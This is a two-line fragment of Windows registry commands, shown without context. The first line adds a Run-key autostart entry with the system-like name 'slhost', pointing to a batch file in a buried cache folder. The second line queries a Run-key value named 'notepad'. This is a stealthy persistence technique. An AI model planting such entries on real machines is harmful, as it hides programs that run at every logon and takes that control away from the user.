...
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat" 
REG QUERY HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v notepad
